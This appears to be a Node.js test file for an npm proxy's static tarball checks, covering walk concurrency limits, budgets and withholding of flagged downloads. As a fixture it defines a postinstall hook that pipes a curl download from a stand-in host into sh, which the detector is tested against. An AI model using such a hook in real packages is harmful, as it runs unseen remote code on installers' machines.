// Since 0.1.6: the tarball checks read EVERY download. A version's first download is walked whether or not a recorded row arms it
// (0.1.5 walked only an armed download and recorded "not checked: not armed" otherwise); the rows still say what armed the walk, and
// "every download" when nothing did. Past the ceiling of 16 walks at once a download is served and stated as before, and retried at
// its next download. With static_withhold on, every walked download is held while the checks read it. Tarballs are synthetic.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import zlib from 'node:zlib';
import { createProxyServer } from '../../proxy/server.js';
import { resetDependencyCache } from '../../gates/dependency-cache.js';
import { forgetManifestHooks } from '../../proxy/manifest-check.js';
import * as S from '../../proxy/static-checks.js';
import { validateConfig, ConfigUnreadable } from '../../config-store.js';

const H = 3_600_000; const T0 = Date.parse('2026-03-01T00:00:00Z'); const at = (h) => new Date(T0 + h * H).toISOString();
function hdr(name, size) {
  const h = Buffer.alloc(512, 0); Buffer.from(name, 'utf8').copy(h, 0, 0, 100);
  h.write('0000644\0', 100); h.write('0000000\0', 108); h.write('0000000\0', 116); h.write(`${size.toString(8).padStart(11, '0')}\0`, 124, 'latin1');
  h.write('00000000000\0', 136); h.write('        ', 148); h.write('0', 156, 'latin1'); h.write('ustar\0', 257, 'latin1'); h.write('00', 263, 'latin1');
  let sum = 0; for (let i = 0; i < 512; i += 1) sum += h[i]; h.write(`${sum.toString(8).padStart(6, '0')}\0 `, 148, 'latin1'); return h;
}
const pad = (b) => Buffer.concat([b, Buffer.alloc((512 - (b.length % 512)) % 512, 0)]);
const tgz = (files) => zlib.gzipSync(Buffer.concat([...Object.entries(files).flatMap(([p, c]) => [hdr(`package/${p}`, Buffer.byteLength(c)), pad(Buffer.from(c))]), Buffer.alloc(1024, 0)]));
const BENIGN = 'module.exports = 1;\n';
const FETCH = 'curl -s https://cdn.example.invalid/x.sh | sh';

// p: nothing named, nothing contributing. h: a fetch-and-run postinstall present since 1.0.0, so 1.1.0 introduces nothing and the
// registry and the tarball agree: no row arms its download, and only reading the tarball finds S0.
const doc = (name, extra = {}) => ({ name, 'dist-tags': { latest: '1.1.0' }, time: { '1.0.0': at(0), '1.1.0': at(48) },
  versions: { '1.0.0': { name, version: '1.0.0', main: 'index.js', ...extra }, '1.1.0': { name, version: '1.1.0', main: 'index.js', ...extra } } });
const P = doc('p');
const HK = doc('h', { scripts: { postinstall: FETCH } });
const DOCS = { '/p': P, '/h': HK };
const TARBALLS = {
  '/p/-/p-1.1.0.tgz': tgz({ 'package.json': JSON.stringify(P.versions['1.1.0']), 'index.js': BENIGN }),
  '/h/-/h-1.1.0.tgz': tgz({ 'package.json': JSON.stringify(HK.versions['1.1.0']), 'index.js': BENIGN }),
};
// s0..s15: like p; their tarballs are HELD by the upstream after the first bytes until release(), so each keeps a walk slot busy
for (let i = 0; i < 16; i += 1) {
  const d = doc(`s${i}`); DOCS[`/s${i}`] = d;
  TARBALLS[`/s${i}/-/s${i}-1.1.0.tgz`] = tgz({ 'package.json': JSON.stringify(d.versions['1.1.0']), 'index.js': BENIGN });
}
let release = () => {}; let released = Promise.resolve();
const holdSlots = () => { released = new Promise((r) => { release = r; }); };
async function withProxy(config, fn) {
  resetDependencyCache(); forgetManifestHooks();
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cg016-every-'));
  const upstream = http.createServer(async (req, res) => {
    const u = decodeURIComponent(req.url.split('?')[0]);
    if (TARBALLS[u] && /^\/s\d+\//.test(u)) {
      res.writeHead(200, { 'content-type': 'application/octet-stream' }); res.write(TARBALLS[u].subarray(0, 20));
      await released; res.end(TARBALLS[u].subarray(20)); return;
    }
    if (TARBALLS[u]) { res.writeHead(200, { 'content-type': 'application/octet-stream' }); res.end(TARBALLS[u]); return; }
    if (DOCS[u]) { res.writeHead(200, { 'content-type': 'application/json' }); res.end(JSON.stringify(DOCS[u])); return; }
    res.writeHead(404, { 'content-type': 'application/json' }); res.end('{}');
  });
  await new Promise((r) => upstream.listen(0, '127.0.0.1', r));
  const proxy = createProxyServer({ port: 0, host: '127.0.0.1', upstream: `http://127.0.0.1:${upstream.address().port}`,
    witnessDbPath: path.join(dir, 'witness.db'), headersTimeoutMs: 10_000, bodyTimeoutMs: 10_000, ...config });
  await new Promise((r) => proxy.listen(0, '127.0.0.1', r));
  const base = `http://127.0.0.1:${proxy.address().port}`;
  const realErr = console.error; console.error = () => {};
  try { return await fn({ base, proxy }); } finally {
    console.error = realErr;
    await new Promise((r) => proxy.close(r)); await new Promise((r) => upstream.close(r)); fs.rmSync(dir, { recursive: true, force: true });
    resetDependencyCache(); forgetManifestHooks();
  }
}
const get = (u) => new Promise((resolve, reject) => http.get(u, { agent: false }, (res) => {
  const chunks = []; res.on('data', (x) => chunks.push(x)); res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: Buffer.concat(chunks) }));
}).on('error', reject));
const settle = () => new Promise((r) => setTimeout(r, 250));
const staticOf = (proxy, pkg, v) => (proxy.witnessDb.getLatestDecision(pkg, v)?.gates_fired ?? []).filter((g) => g.gate.startsWith('static:'));
async function staticEventually(proxy, pkg, v, ms = 5000) {
  const until = Date.now() + ms; let rows = staticOf(proxy, pkg, v);
  while (rows.length < S.STATIC_GATES.length && Date.now() < until) { await new Promise((r) => setTimeout(r, 50)); rows = staticOf(proxy, pkg, v); }
  return rows;
}

test('ED1 the ceiling is 16 walks at once; walkReason gives what armed the walk, or "every download" when no row did', () => {
  assert.equal(S.MAX_ARMED_WALKS, 16);
  assert.equal(S.walkReason([{ gate: 'install-introduced', result: 'WARN', detail: 'x' }]), 'named row install-introduced');
  assert.equal(S.walkReason([{ gate: 'identity-break', result: 'NOTE', detail: 'x' }]), 'identity-break');
  assert.equal(S.walkReason([]), 'every download');
  assert.equal(S.walkReason(null), 'every download');
  assert.equal(S.walkReason([{ gate: 'size-jump', result: 'NOTE', detail: 'x' }]), 'every download');
});

test('ED2 a download no row arms is walked: every static row is a read outcome naming "every download", and it is not walked again', async () => {
  await withProxy({}, async ({ base, proxy }) => {
    await get(`${base}/p`);
    const r = await get(`${base}/p/-/p-1.1.0.tgz`); assert.equal(r.status, 200);
    const rows = await staticEventually(proxy, 'p', '1.1.0');
    assert.deepEqual(rows.map((x) => x.gate).sort(), [...S.STATIC_GATES].sort());
    for (const x of rows) {
      assert.doesNotMatch(x.detail, /^not checked: not armed/, `${x.gate}: ${x.detail}`);
      assert.match(x.detail, /armed by every download/, `${x.gate}: ${x.detail}`);
    }
    assert.equal(S.staticSettled(proxy.witnessDb.getLatestDecision('p', '1.1.0')), true);
    const n = proxy.witnessDb.getDecisionHistory('p', '1.1.0').length;
    await get(`${base}/p/-/p-1.1.0.tgz`); await settle();
    assert.equal(proxy.witnessDb.getDecisionHistory('p', '1.1.0').length, n, 'a settled outcome is not walked again');
  });
});

test('ED3 a long-standing fetch-and-run hook that no row arms: its first download records the named S0 WARN', async () => {
  await withProxy({}, async ({ base, proxy }) => {
    await get(`${base}/h`);
    const r = await get(`${base}/h/-/h-1.1.0.tgz`); assert.equal(r.status, 200, 'switch off: served, as before');
    const rows = await staticEventually(proxy, 'h', '1.1.0');
    const s0 = rows.find((x) => x.gate === 'static:S0-shell-fetch-in-hook');
    assert.equal(s0?.result, 'WARN', s0?.detail);
    assert.match(s0.detail, /armed by every download/);
  });
});

test('ED4 with static_withhold on, that first download is withheld (HTTP 403 withheld_by_static_check); a clean one is served whole', async () => {
  await withProxy({ staticWithhold: true }, async ({ base }) => {
    await get(`${base}/h`);
    const r = await get(`${base}/h/-/h-1.1.0.tgz`);
    assert.equal(r.status, 403);
    assert.match(r.body.toString('utf8'), /withheld_by_static_check/);
    assert.match(r.body.toString('utf8'), /static:S0-shell-fetch-in-hook/);
    await get(`${base}/p`);
    const ok = await get(`${base}/p/-/p-1.1.0.tgz`);
    assert.equal(ok.status, 200);
    assert.ok(ok.body.equals(TARBALLS['/p/-/p-1.1.0.tgz']), 'the held bytes are the upstream bytes');
  });
});

test('ED5 a record that says "not checked: not armed" (written by 0.1.5) is not settled, so the next download walks it', () => {
  const old = S.unarmedRows('no named row, no identity-break, no entry-path-change, no coverage gap');
  assert.equal(S.staticSettled({ gates_fired: old }), false);
  const ceiling = S.unarmedRows(`concurrency ceiling: ${S.MAX_ARMED_WALKS} armed walks in flight`);
  assert.match(ceiling[0].detail, /^not checked: not armed \(concurrency ceiling: 16 armed walks in flight\)/);
  assert.equal(S.staticSettled({ gates_fired: ceiling }), false);
});

test('ED6 a download that found no walk slot within the bound says so, and is read at its next download', () => {
  const rows = S.budgetRows(10_000);
  assert.deepEqual(rows.map((r) => r.gate), S.STATIC_GATES);
  for (const r of rows) { assert.equal(r.result, 'SKIP'); assert.equal(r.detail, 'not checked: walk budget exceeded (waited 10 s)'); }
  assert.equal(S.budgetRows(300)[0].detail, 'not checked: walk budget exceeded (waited 0.3 s)');
  assert.equal(S.staticSettled({ gates_fired: rows }), false);
});

test('ED7 static_walk_wait_ms: 10 s by default, a whole number of milliseconds up to 60,000', () => {
  assert.equal(validateConfig({}).staticWalkWaitMs, 10_000);
  assert.equal(validateConfig({ static_walk_wait_ms: 0 }).staticWalkWaitMs, 0);
  assert.equal(validateConfig({ static_walk_wait_ms: 60_000 }).staticWalkWaitMs, 60_000);
  for (const bad of [-1, 60_001, 1.5, '10000', true]) assert.throws(() => validateConfig({ static_walk_wait_ms: bad }), ConfigUnreadable, String(bad));
});

// 16 downloads whose upstream is held keep every walk slot busy; the 17th waits for one
async function fillSlots(base) {
  holdSlots();
  for (let i = 0; i < 16; i += 1) await get(`${base}/s${i}`);
  const reqs = [];
  for (let i = 0; i < 16; i += 1) {
    reqs.push(new Promise((resolve) => { const r = http.get(`${base}/s${i}/-/s${i}-1.1.0.tgz`, { agent: false }, (res) => { res.on('data', () => {}); res.on('end', resolve); }); r.on('error', resolve); }));
  }
  await new Promise((r) => setTimeout(r, 300));
  return reqs;
}

test('ED8 with every slot busy a download waits for one (bounded) and is walked; the wait is recorded beside facts_ms', async () => {
  await withProxy({}, async ({ base, proxy }) => {
    const busy = await fillSlots(base);
    await get(`${base}/p`);
    const t0 = Date.now();
    const pr = get(`${base}/p/-/p-1.1.0.tgz`);
    setTimeout(() => release(), 600);
    const r = await pr; assert.equal(r.status, 200);
    assert.ok(Date.now() - t0 >= 500, 'it waited for a slot');
    await Promise.all(busy);
    const rows = await staticEventually(proxy, 'p', '1.1.0');
    for (const x of rows) assert.match(x.detail, /armed by every download$/, `${x.gate}: ${x.detail}`);
    const w = proxy.witnessDb.db.prepare("SELECT walk_wait_ms FROM entry_fact_versions WHERE package_name = 'p'").get();
    assert.ok(w && w.walk_wait_ms >= 400, JSON.stringify(w));
  });
});

test('ED9 past the bound the download is served unwalked, says "walk budget exceeded", and its next download reads it', async () => {
  await withProxy({ staticWalkWaitMs: 300 }, async ({ base, proxy }) => {
    const busy = await fillSlots(base);
    await get(`${base}/p`);
    const r = await get(`${base}/p/-/p-1.1.0.tgz`); assert.equal(r.status, 200);
    assert.ok(r.body.equals(TARBALLS['/p/-/p-1.1.0.tgz']), 'served whole');
    const rows = await staticEventually(proxy, 'p', '1.1.0');
    for (const x of rows) assert.match(x.detail, /^not checked: walk budget exceeded \(waited 0\.3 s\)/, `${x.gate}: ${x.detail}`);
    release(); await Promise.all(busy);
    await get(`${base}/p/-/p-1.1.0.tgz`);
    const until = Date.now() + 5000; let again = staticOf(proxy, 'p', '1.1.0');
    while (again.some((x) => /walk budget/.test(x.detail)) && Date.now() < until) { await new Promise((z) => setTimeout(z, 50)); again = staticOf(proxy, 'p', '1.1.0'); }
    for (const x of again) assert.match(x.detail, /armed by every download$/, `${x.gate}: ${x.detail}`);
  });
});
